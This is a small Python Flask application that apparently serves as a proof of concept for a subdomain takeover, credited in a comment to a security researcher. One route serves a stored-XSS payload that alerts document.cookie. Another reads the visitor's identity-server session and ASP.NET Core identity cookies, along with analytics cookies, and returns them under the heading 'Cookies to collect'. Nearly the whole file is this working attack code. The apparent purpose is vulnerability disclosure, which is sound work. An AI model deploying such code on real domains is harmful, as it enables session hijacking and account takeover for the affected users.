from flask import Flask, request, make_response
app = Flask(__name__)

@app.route("/")
def hello():
    return ""

@app.route("/20wk2yc8p6caztasx7bb")
def hello_poc():
    return "<!-- subdomain takeover PoC by Dominique van Dorsselaer -->"

@app.route("/30prbe8wn2ap79kjt1he")
def hello_poc_sxss():
    return "<!DOCTYPE html><html><body><script>alert(document.cookie)</script></body></html><!DOCTYPE html><title></title>"

@app.route('/6w1ymvcfdrf33n7m2cc6')
def collect_cookies():
    _ga = request.cookies.get('_ga')
    _gid = request.cookies.get('_gid')
    idsrvsession = request.cookies.get('idsrv.session')
    AspNetCoreIdentityApplication = request.cookies.get('.AspNetCore.Identity.Application')
    return f"Cookies to collect:" \
    f"_ga = {_ga}" \
    f"_gid = {_gid}" \
     f"idsrv.session = {idsrvsession}" \
    f".AspNetCore.Identity.Application = {AspNetCoreIdentityApplication}"
